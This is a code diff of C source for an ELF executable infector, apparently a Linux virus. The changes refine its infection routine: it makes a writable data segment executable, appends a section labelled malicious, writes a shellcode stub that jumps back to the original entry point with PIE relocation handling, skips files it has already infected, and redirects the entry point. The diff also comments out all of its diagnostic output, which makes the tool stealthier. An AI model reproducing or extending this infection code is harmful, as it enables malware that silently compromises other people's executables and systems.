@@ -1,5 +1,5 @@
 #define _XOPEN_SOURCE 500
-#include <stdio.h>
+//#include <stdio.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/time.h>
@@ -54,125 +54,148 @@ typedef struct temp_Elf64_Ehdr{
   Elf64_Half    e_shstrndx;             /* Section header string table index */
 } temp_Elf64_Ehdr;//Elf64_Ehdr;
 
-void infect(const char* fpath){
-    printf("%s will be infected.\n", fpath);
-}
 
 int activate(){
     return 1; // 
 }
 
 void change_entrypoint(const char* fpath, char *newaddr){
-	int fd;
-	int i;
-	int shellcodeloc;
-	char jmp2original[12];
+	int fd, i, shellcodeloc;
+	int is_infected_already = 1;  
+	char jmp2original[15];
 	Elf64_Shdr shdr;
 	Elf64_Phdr phdr;
 	Elf64_Ehdr ehdr;
 	
 	if(access(fpath,R_OK|W_OK|X_OK)!=0){ 
-		printf("[ERROR] Permission error(%s)\n",fpath);
+		//printf("[ERROR] Permission error(%s)\n",fpath);
 		return 0;
 	}
 	if(!activate()){
-		printf("[ERROR] Debugger detected(%s)\n",fpath);
+		//printf("[ERROR] Debugger detected(%s)\n",fpath);
 		return 0;
 	}
 	fd = open(fpath, O_RDWR); // Cannot open virus file itself.
 	if (fd < 0){
-		printf("[ERROR] fd error(%s)\n",fpath);
+		//printf("[ERROR] fd error(%s)\n",fpath);
 		return 0;
 	}
 	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
-		printf("[ERROR] ehdr read error(%s)\n",fpath);
+		//printf("[ERROR] ehdr read error(%s)\n",fpath);
 		return 0;
 	}
 	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ 
-		printf("[ERROR] not ELF!(%s) \n",fpath);
+		//printf("[ERROR] not ELF!(%s) \n",fpath);
 		return 0;
 	}
 	
-	printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
+	//printf("[INFECTED] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
 	
-	// elf헤더의 섹션갯수 늘리기
-	// 실제섹션은 31갠데 섹션갯수만32로늘어나면 모종의이유로 gdb심볼로드가 안됨. 
+	// [01] Add section # for malicious section. (31 --> 32)
 	ehdr.e_shnum = ehdr.e_shnum + 1;
 	lseek(fd, 0, SEEK_SET);
 	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); 
-	printf("[INFECTED] Section header entry num (%s): %d\n", fpath, ehdr.e_shnum);
+	//printf("[INFECTED] Section header entry num (%s): %d\n", fpath, ehdr.e_shnum);
 	
 	
 	
-	// 여러개의 phdr 정보들을 읽고 대상프로그램헤더를 가져오기
-	lseek(fd, ehdr.e_phoff, SEEK_SET); // e_phoff 로 테이프를보낸다. 
+	// [02] Read page headers info.
+	lseek(fd, ehdr.e_phoff, SEEK_SET); // TAPE : page header start offset
 	for(i=0;i<ehdr.e_phnum;i++){
 		if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)){
-			printf("[ERROR] phdr read error(%s)\n",fpath);
+			//printf("[ERROR] phdr read error(%s)\n",fpath);
 			return 0;
 		}
 		else{
-			printf("[INFO] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
+			//printf("[INFO] phdr.p_flags = %d, phdr.p_vaddr = 0x%x\n",phdr.p_flags,phdr.p_vaddr);
 			
-			// (RW_) Loadable Segment 임과동시에 PF_Read_Write (6) 권한인세그먼트의경우
+			// Find RW_ Data page(Loadable Segment && PF_Read_Write(6)) and add Executable permission.
 			if(phdr.p_type==1 && phdr.p_flags==6){
-				lseek(fd, -sizeof(phdr), SEEK_CUR); // 쓰기위해되돌아감
-				printf("[BEFORE] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
-				phdr.p_flags=7; //Loadable Segment의 권한을 RWX로 셋팅
-				phdr.p_filesz += 0x1000; //페이지사이즈 늘리기
-				phdr.p_memsz = phdr.p_filesz;  //페이지사이즈 늘리기
+				lseek(fd, -sizeof(phdr), SEEK_CUR); // go back to start of page header
+				// printf("[BEFORE] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
+				phdr.p_flags=7; // RWX flag
+				phdr.p_filesz += 0x1000; // increase page size --> trigger allocate more pages shellcode.
+				phdr.p_memsz = phdr.p_filesz;  // same reason
 				write(fd, &phdr, sizeof(phdr));
-				printf("[AFTER] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
-				break; //대상 phdr를 읽은상태에서 break.
+				//printf("[AFTER] phdr.p_flags = %d, phdr.p_filesz = 0x%x, phdr.p_memsz = 0x%x\n",phdr.p_flags,phdr.p_filesz,phdr.p_memsz);
+				is_infected_already = 0; // This binary is not infected already.
+				break; // 대상 phdr를 읽은상태에서 break.
 			}
 		}
 	}
+	if(is_infected_already){
+		//printf("[OOPS] This binary is already infected! Terminate infection routine.\n");
+		return 0;
+	}
 	
-	// 프로그램헤더 엔트리사이즈 = ehdr.e_phentsize
-	// 프로그램헤더 갯수 = ehdr.e_phnum
+	
+	/*---------------------------------------------------------------------------*/
+	// Section header for malicious section. 
 	
 	
-	//파일의마지막에 가짜섹션을 덧붙이기
-	//Prepare fake section 
+	// [03] Add section header (of malicious section)at the end of file.  
 	shdr.sh_name = 0;      
 	shdr.sh_type = 3;      
 	shdr.sh_flags = 0;     
-	shdr.sh_addr = (phdr.p_vaddr & 0xfffff000) + (phdr.p_filesz & 0xfffff000) + 0x1000; //스타트어드레스
-	shdr.sh_offset = ehdr.e_shoff + (ehdr.e_shentsize * ehdr.e_shnum);//파일의사이즈
+	shdr.sh_addr = (phdr.p_vaddr & 0xfffffffffffff000) + (phdr.p_filesz & 0xfffffffffffff000) + 0x1000; // Start address of this section.
+	shdr.sh_offset = ehdr.e_shoff + (ehdr.e_shentsize * ehdr.e_shnum); // total size of file. meaning end of file.  
 	shdr.sh_size = 0x1000; 
 	shdr.sh_link = 0;      
 	shdr.sh_info = 0;      
 	shdr.sh_addralign = 1; 
 	shdr.sh_entsize = 0;   
-	printf("[NEW] shdr.sh_addr(0x%x) = (phdr.p_vaddr(0x%x) & 0xfffff000) + (phdr.p_filesz(0x%x) & 0xfffff000) + 0x1000\n",shdr.sh_addr,phdr.p_vaddr,phdr.p_filesz);
-	printf("[NEW] shdr.sh_addr = 0x%x, shdr.sh_offset = 0x%x\n",shdr.sh_addr,shdr.sh_offset);
+	//printf("[NEW] shdr.sh_addr(0x%x) = (phdr.p_vaddr(0x%x) & 0xfffffffffffff000) + (phdr.p_filesz(0x%x) & 0xfffffffffffff000) + 0x1000\n",shdr.sh_addr,phdr.p_vaddr,phdr.p_filesz);
+	//printf("[NEW] shdr.sh_addr = 0x%x, shdr.sh_offset = 0x%x\n",shdr.sh_addr,shdr.sh_offset);
 	
 	shellcodeloc = shdr.sh_addr + shdr.sh_offset % 0x1000; //페이지정보는 sh_addr에반영되있으므로 sh_offset에서는페이지정보제거
-	printf("[NEW] shellcodeloc(0x%x) = hdr.sh_addr(0x%x) + shdr.sh_offset(0x%x)\n",shellcodeloc, shdr.sh_addr, shdr.sh_offset);
+	//printf("[NEW] shellcodeloc(0x%x) = hdr.sh_addr(0x%x) + shdr.sh_offset(0x%x)\n",shellcodeloc, shdr.sh_addr, shdr.sh_offset);
 	
-	printf("[BEFORE] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
+	//printf("[BEFORE] Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
 
 	lseek(fd,0,SEEK_END); 
 	write(fd, &shdr, sizeof(shdr));
+	
+	
+	/*---------------------------------------------------------------------------*/
+	// Malicious section 
+	
+	/*
+	  We use $RDI register to get relocation information. 
+	  $RDI holds address holds start VA offset info!
+	  
+	  ex)
+	  
+	  - If PIE binary : 
+	  *RDI  0x7ffff7ffe168 <- 0x555555554000 
+	
+	  - If not :  
+	  *RDI  0x7ffff7ffe168 <— 0x0
+	*/
+	
 	
 	/* 48 b8 41 41 41 41 41 41 41 41	movabs rax,0x4141414141414141 */
 	jmp2original[0] = 0x48;
 	jmp2original[1] = 0xb8;
 	memcpy(&jmp2original[2], &ehdr.e_entry, sizeof(ehdr.e_entry));
 	
+	/* 48 03 07	add    rax,QWORD PTR [rdi]*/
+	jmp2original[10] = 0x48;
+	jmp2original[11] = 0x03;
+	jmp2original[12] = 0x07;
+	
 	/* ff e0	jmp    rax */
-	jmp2original[10] = 0xff;
-	jmp2original[11] = 0xe0;
+	jmp2original[13] = 0xff;
+	jmp2original[14] = 0xe0;
+	
 	
 	// 섹션헤더끝나고 바로쉘코드집어넣기. lseek필요없음
 	write(fd,jmp2original,sizeof(jmp2original));
 	
-	//Entry point overwriting routine.. Don't touch it!
-	//ehdr.e_entry = strtol(newaddr, NULL, 16);
+	//엔트리포인트 수정하기
 	ehdr.e_entry = shellcodeloc;
 	lseek(fd, 0, SEEK_SET);
 	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0; //write 실패
-	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
+	//printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
 	
 }
 
